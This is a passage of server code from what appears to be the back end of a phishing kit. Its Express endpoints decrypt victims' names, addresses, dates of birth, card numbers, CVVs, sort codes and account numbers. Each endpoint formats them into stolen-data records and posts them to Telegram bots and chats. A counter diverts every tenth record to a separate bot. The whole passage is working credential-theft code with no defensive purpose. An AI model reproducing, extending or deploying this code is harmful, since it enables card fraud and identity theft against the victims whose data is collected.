  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleSmoked:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-657196971",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/trizApple", cors());

app.post("/trizApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-712431616",
            text: `AppleTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Complete");
    });
});

app.options("/tcapzApple", cors());

app.post("/tcapzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleTcapz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1437456088,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

let fasterpayments = 0;

app.options("/fasterpaymApple", cors());

app.post("/fasterpaymApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fasterpayments == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5470125126,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments += 1;
      }
      res.send("Update Complete");
    });
});

let blackTesco = 0;

app.options("/blacktescoApple", cors());

app.post("/blacktescoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5028651320,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/yardzApple", cors());

app.post("/yardzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yardzCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5138777422,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/osbApple", cors());

app.post("/osbApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248091713,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill += 1;
      }
      res.send("Update Complete");
    });
});

let cya = 10;

app.options("/cyaApple", cors());

app.post("/cyaApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-752137860",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

let heisenberg = 0;

app.options("/heisenbergApple", cors());

app.post("/heisenbergApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
